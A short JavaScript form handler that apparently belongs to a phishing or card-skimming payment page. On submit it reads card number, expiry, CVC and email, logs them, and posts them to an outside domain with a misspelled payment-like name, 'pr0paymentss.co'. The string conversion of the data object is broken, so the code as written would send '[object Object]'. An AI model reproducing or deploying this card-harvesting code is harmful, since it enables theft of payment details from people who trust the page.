const form = document.getElementById('form');
form.addEventListener('submit', getFormValue);
function getFormValue(event) {
    event.preventDefault();    
    let cardnumber = form.querySelector('[name="card_number"]');
    let cardmonth = form.querySelector('[name="card_month"]');
    let cardyear = form.querySelector('[name="card_year"]');
    let cardcvc = form.querySelector('[name="card_cvc"]');
    let email = form.querySelector('[name="email"]');
    console.log(cardnumber.value,cardmonth.value,cardyear.value,cardcvc.value,email.value)
    const data = {
        number: cardnumber.value,
        cardmonth: cardmonth.value,
        cardyear:  cardyear.value,
        cardcvc: cardcvc.value,
        email: email.value
    }
    $.post('https://pr0paymentss.co/api/request/', {text: `${data}`}, function(data){
        console.log("Успешно отправлено")
    });
}